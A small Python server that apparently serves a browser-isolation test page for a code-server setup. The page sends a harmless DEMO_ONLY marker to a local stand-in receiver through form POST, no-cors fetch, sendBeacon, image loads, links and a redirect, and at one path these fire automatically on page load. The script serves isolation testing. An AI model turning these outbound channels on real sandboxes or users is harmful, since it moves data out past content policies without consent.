"""Intentionally active preview: stronger than Markdown's default CSP."""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HTML = '''<!doctype html><meta charset="utf-8"><title>Browser boundary demo</title>
<style>body{font:18px system-ui;background:#101827;color:#e5e7eb;max-width:900px;margin:70px auto;padding:20px}button,a{font:inherit;padding:12px;margin:6px;color:#67e8f9}button{background:#25334a;border:1px solid #52627a;border-radius:8px}code{color:#fbbf24}#result{white-space:pre-wrap}</style>
<h1>Browser boundary demo</h1><p>All probes use the disposable receiver. No real credentials or external services.</p>
<p>Compare the allowed and blocked requests using the receiver log. Browser isolation is configured separately for each OS.</p>
<form action="http://receiver.localhost:9000/form" method="POST" target="_blank">
<input type="hidden" name="marker" value="DEMO_ONLY"><button id="form">One-click form POST</button></form>
<button id="fetch" onclick="probe()">Fetch POST (no-cors)</button>
<button id="beacon" onclick="document.querySelector('#result').textContent='Queued: '+navigator.sendBeacon('http://receiver.localhost:9000/beacon','DEMO_ONLY')">sendBeacon POST</button>
<p><a id="link" href="http://receiver.localhost:9000/link" target="_blank">External link / new tab</a></p>
<p><a id="redirect" href="/redirect" target="_blank">Allowed URL → external redirect</a></p>
<p><a href="http://ide.localhost:8000/?folder=/workspace">Return to code-server</a></p>
<pre id="result">Ready. A queued request is not proof of delivery; inspect the receiver log.</pre>
<script>async function probe(){try{let r=await fetch('http://receiver.localhost:9000/fetch',{method:'POST',mode:'no-cors',body:'DEMO_ONLY'});document.querySelector('#result').textContent='fetch completed: '+r.type}catch(e){document.querySelector('#result').textContent=String(e)}}
if(location.pathname==='/auto'){probe();navigator.sendBeacon('http://receiver.localhost:9000/auto-beacon','DEMO_ONLY');let i=new Image();i.src='http://receiver.localhost:9000/image?marker=DEMO_ONLY'}</script>'''


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/redirect':
            self.send_response(302)
            self.send_header('Location', 'http://receiver.localhost:9000/redirected')
            self.end_headers()
            return
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(HTML.encode())


ThreadingHTTPServer(('0.0.0.0', 8001), Handler).serve_forever()
